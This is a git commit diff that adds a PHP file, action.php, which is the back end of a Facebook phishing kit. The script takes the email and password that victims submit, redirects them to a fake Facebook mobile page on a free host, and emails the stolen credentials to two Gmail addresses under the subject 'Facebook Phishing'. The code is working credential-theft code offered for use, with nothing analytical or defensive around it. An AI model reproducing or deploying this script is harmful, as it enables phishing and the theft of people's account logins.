832940e1b0e4e0207d237428847a0eabdac4b257
DarkMemberGH <115490082+DarkMemberGH@users.noreply.github.com>
2024-12-09 14:36:53 +0530

    Add files via upload

---
+++ action.php
@@ -0,0 +1,39 @@
+<?php
+$var = $_POST['email'];
+$var2 = $_POST['pass'];
+$myFile = file_get_contents("pwned.html");
+$searchString = "<html><title>Your Connection To This Website is Secure</title>
+<text>You Have Been PWNED!</text>
+</html>";
+if($myFile == $searchString) {
+    header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
+}
+if($myFile != $searchString) {
+    header('Location: https://darkmember2000.000webhostapp.com/facebookmobile.html');
+}
+$headers = "From:amugawaya@gmail.com";
+$to = "flashcyber86@gmail.com";
+$me = "darkmember2000@gmail.com";
+$txt ="
+╬═════════════════════╬
+   ◈ Code By Manoj ◈        
+╬═════════════════════╬
+                                    
+                                    
+╬═════════════════════╬
+
+  Email :- $var
+  
+═══════════════════════  
+
+  Password :- $var2
+  
+═══════════════════════
+
+";
+$subject = "Facebook Phishing";
+mail($me,$subject,$txt,$headers);
+mail($to,$subject,$txt,$headers);
+exit();
+?>
+
